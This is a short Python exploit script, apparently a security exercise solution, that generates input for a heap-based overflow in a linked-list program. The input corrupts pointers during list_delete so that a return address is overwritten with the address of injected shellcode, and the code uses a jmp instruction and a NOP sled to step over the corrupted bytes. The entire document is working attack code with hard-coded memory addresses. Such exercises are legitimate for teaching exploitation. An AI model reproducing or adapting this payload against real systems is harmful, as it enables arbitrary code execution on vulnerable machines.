from shellcode import shellcode
from struct import pack 

# pointer manipulation in list_delete corrupts the first few bytes of shellcode

ret_addr = 0xbffe99ec 
shell_code_addr = 0x080f3780

# 1st node: doesn't matter what we put in
print shellcode 

# 2nd node: the last two addresses we put in overflow to the 3rd node
print shellcode + '\x90' *17 + pack("<I",shell_code_addr) + pack("<I",ret_addr) 

# 3rd node: jmp instruction, nops, and finally shellcode
# the first few bytes will get corrupted, so can't place shellcode there
print "\xeb" + "\x06" + "\x90"*6 + shellcode





